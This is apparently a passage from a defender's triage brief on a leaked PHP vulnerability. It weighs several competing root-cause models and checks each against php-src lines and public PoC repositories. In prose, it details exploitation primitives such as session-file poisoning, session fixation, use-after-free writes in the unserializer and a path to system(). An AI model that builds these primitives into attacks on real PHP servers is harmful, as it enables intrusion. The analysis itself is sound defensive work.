It is kept for two reasons the project's rules require: failed hypotheses are evidence, and the reason five plausible models all pointed at the same subsystem is itself the operational lesson — session.upload_progress is a consumer of CVE-2026-109619, so every researcher who started from the leaked PoC and worked backwards from the session handler was led away from the bailout that actually frees the memory.

What follows is the pre-advisory state, unedited apart from this notice.

Model A — heap use-after-free in the upload-progress callback

Published by J4ck3LSyN (ATLAS) with research credits to Andrew Dorman and Arch&Yuki, and mirrored by at least one GitHub repository. It claims php_session_rfc1867_callback caches two raw zval * bucket pointers (post_bytes_processed, current_file_bytes_processed) that are invalidated when the session tree is freed and rebuilt on a second progress update. The stale pointer is shaped into a fake zend_fcall_info, reaching zend_call_function and then system().

Its own page undercuts the strongest reading: it requires a per-build offset leak between zval_ptr_dtor and zend_call_function, ships three vendor debug-symbol files to derive it, and describes itself as "weaponized (lab)". Unconfirmed (source)

What the bundle's own validation says — and what we could verify

The bundle now carries VALIDATION.md, REPORT_VALIDATION.md, RATING.md and DELTAS_LSphp.md. They describe two bugs (a stale read through post_bytes_processed and a stale store through current_file_bytes_processed) and cite exact source lines rather than prose. The document labels itself "conceptually validated … ASAN reproduction in progress"; the page's section 7 then reports that reproduction: the 258-byte multipart request reached the vulnerable path and armed both cached bucket pointers, but no ASAN heap-use-after-free fired. The author's explanation is that the freed chunk must first be reclaimed as an attacker-shaped 149-element packed array, and that grooming stage is not in the bundle.

We checked the source claims independently against the php-src PHP-8.4 branch at 06:45 UTC. All twelve cited lines match what the tool describes — the two cached zval * fields at php_session.h:136–137, the zend_hash_str_find captures at session.c:3316/3342, the stores at :3355/3356/3375, the zend_hash_update at :3214, min_freq at :953, and FILLUNIT 5120 at rfc1867.c:184. We also confirmed the disputed Z_TRY_ADDREF(progress->data) at session.c:3213, one line before that zend_hash_update — the addref the independent 04:38 audit says prevents the tree from being freed at all. Source reading: accurate. End-to-end exploitation: still not demonstrated by anyone.

Model B — session and multipart state-machine flaws

A second repository documents five primitives verified against php:8.4.4-cli in a local Docker instance and explicitly states that Model A's "two-update UAF" is "mechanically falsified" — nothing in its chain touches a dangling pointer. Its primitives:

  • P1 — a multipart form field named PHPSESSID is accepted before script resolution, creating sess_<attacker-chosen-id> even with session.use_only_cookies=On and no Cookie header.
  • P2 — the PHP_SESSION_UPLOAD_PROGRESS value is stored verbatim as a session key and re-serialized into the session file, so attacker-chosen content lands on disk.
  • P3 — corrected at 07:00 UTC. The original claim was that exceeding max_multipart_body_parts skips the cleanup event, leaving the poisoned file behind. It does not: the bail path does goto fileupload_done (rfc1867.c:797) and MULTIPART_EVENT_END fires there unconditionally (:1268–1273). With stock cleanup=1 the progress entry is therefore deleted and the session file ends up empty. The 19h repository has reached the same conclusion in its own README ("CORRECTED MODEL", cleanup=0 → 556 B, cleanup=1 → 0 B) while its report file still states the opposite. Treat session.upload_progress.cleanup=0 as a hard prerequisite for this chain. Verified in source by us.
  • P4/P5 — session fixation with attacker-chosen values, and a silent write-denial when the marker contains |.

RCE in this model needs an application-level code-execution sink — an include()/require() of a session-mapped path, or unserialization of attacker-controlled session values. That is a materially narrower claim than "unauthenticated RCE on any PHP host". Medium — locally reproduced, not independently audited. (repository)

Model C — the missing cookie-only guard, already public since May

php-src PR #22113, opened 2026-05-21 and still open, adds exactly the guard Model B's P1 describes: php_session_rfc1867_early_find_sid() already honoured use_only_cookies for $_GET, but the form-field capture in MULTIPART_EVENT_FORMDATA had no such check. The pull request adds a four-line check and a rfc1867_sid_post_use_only_cookies.phpt test.

Its author wrote, in the pull request itself: "I don't know if this is a security fix." It has been reviewed and reworked but never merged. This predates the leak by five months and is the single strongest corroboration that at least one of the two flaws is a session-handling logic bug rather than memory corruption.

Re-checked 06:41 UTC: still open, merged: false, last updated 2026-10-16, 9 comments and 2 review comments, head branch jorgsowa:fix/session-upload-progress-use-only-cookies targeting PHP-8.4. Unchanged since the leak — if this were the fix, it would have been merged by now.

Analytic inference — not a published finding

Two CVE identifiers for what several sources describe as one disclosure is easiest to explain as two distinct issues: one memory-safety bug and one session/multipart logic bug. Nothing public confirms that split, the mapping between IDs and issues is ambiguous in every circulating source, and the jackalsyn bundle never says which ID is which. Treat the pairing as unresolved until 14:00 UTC.

Revised 09:10 UTC: a third candidate now exists for the memory-safety half — the unserializer reentry described above, rather than the session callback. The "one memory bug, one logic bug" shape survives; which memory bug does not. That is one more reason not to build detections on a specific primitive before the advisory lands.

What this means for your risk assessment

If Model A is correct, internet-facing PHP is directly exploitable and the 9.2 score is conservative. If Model B is correct, mass exploitation depends on how many applications include session paths — far fewer than "all PHP", but the session-fixation primitive alone is still a credential-theft problem on nearly every PHP application. Plan for the worse case, but do not tell leadership that every PHP server is a guaranteed shell.

A fourth chain, outside session.c — checked 09:00 UTC

At 07:55 UTC a repository appeared claiming three independent RCE chains, the memory-corruption one located in PHP's unserializer rather than the session handler: ikow/php2shell-poc, by Qi Deng. The author has prior published work on React Server Components RCEs, which earns a read rather than a dismissal — so we read it, and then we read the code it describes.

The mechanism, taken from PHP-8.4 in our own tree:

  • var_destroy() frees the back-reference var_entries chunks first (var_unserializer.re:242–246), then walks the delayed-destructor list and calls i_zval_ptr_dtor() at :308. Unlike the __wakeup and __unserialize invocations at :277 and :294, that destructor call is not bracketed by BG(serialize_lock).
  • With the lock down, a unserialize() issued from inside __destruct takes the reuse branch of php_var_unserialize_init() (:77–80) and is handed the in-flight parser state — the exact structure whose back-reference chunks were freed a moment earlier.
  • The inner parse then runs var_push() against ->last, which still points into the freed chunk: :118 reads it and :132 writes data[used_slots++] through it. That is a use-after-free write, not merely the stale read the author's back-reference trigger demonstrates.
Assessment — a real defect, at the wrong size

Source confirmed the ordering, the missing lock and the reuse branch are exactly as described. We did not execute anything: this environment has neither a PHP binary nor a container runtime, so the author's ASAN trace remains Unreproduced here.

Long-standing, therefore unlikely to be new the same reuse logic is present verbatim in PHP-7.2 (:37) and PHP-8.2 (:63). A defect shipped for years, in a path every object-carrying unserialize() traverses, is an odd candidate for a freshly assigned critical — whatever it is filed under.

Not a pre-auth core RCE all three of the repository's chains need something from the application: an include() of an attacker-influenced path, an unserialize() of attacker-controlled data with classes permitted, or a per-directory session.serialize_handler mismatch plus a POP gadget. That precondition is the one the earlier models already carried, restated as though it were new.

The escalation is asserted rather than shown — reading zif_system out of executor_globals.function_table and rewriting var_dump's handler through /proc/self/mem. The write step presupposes code execution the chain has not yet obtained, and the ASLR position is never explained. Treat the whole thing as a Medium lead against a Unconfirmed CVE mapping. Note also that the README's "full writeup" link points at a Substack whose newest post is dated 19 October and is not about PHP — as of 09:00 UTC the only copy of this analysis is the repository itself.

Model E — the leaker's own root cause, in zend_interfaces.c — checked 13:35 UTC

This one matters more than its position in the list suggests, because of who published it. The @calif_io account that dropped the PHP2Shell claim and the exploit video on 20 October also published a technical write-up and PoC under the label MADBugs. It locates the bug somewhere none of the other four models do: Zend/zend_interfaces.c.

The claim is a one-line omission. zend_user_unserialize() dispatches the userland Serializable::unserialize() method, and unlike the __wakeup and __unserialize dispatch points in var_unserializer.re (:277, :294, both verified in this brief), it does not raise BG(serialize_lock). With the lock at zero, an inner unserialize() called from inside that method shares the outer parser's back-reference table; the inner object's property zvals get registered as outer slots pointing into its own property-table buffer; a later property-table resize frees that buffer; and an R:N back-reference then reads through the stale slot.

What we verified, and what it implies for the CVE mapping

Source confirmed zend_user_unserialize() at zend_interfaces.c:442–461 contains no BG(serialize_lock) increment — the string does not appear anywhere in that file — and the function is byte-for-byte equivalent in PHP-8.2 at :438. The asymmetry with the __wakeup/__unserialize paths is real.

But it is probably not either CVE. The write-up assigns no CVE identifier, and it notes PHP's standing 2017 policy that unserialize() memory-corruption bugs are not treated as security vulnerabilities. If that policy still holds, a 9.2 advisory is unlikely to be this. The likelier reading is that the leak bundled two different things: the session-handler CVEs that PHP is actually patching at 14:00 UTC, and a separate unserializer UAF that the leaker had also found and demonstrated.

Reproduction is claimed, not witnessed — 10/10 local runs on PHP 8.5.5, and 3/3 remote against php:8.5-apache at roughly 2,375 HTTP requests per run. We have not reproduced it and cannot: no PHP runtime here. The remote precondition is genuinely strong — the target must load a Serializable class that recursively deserializes inner data and then enlarges the inner object's property table. The write-up itself calls real-world matches "uncommon".
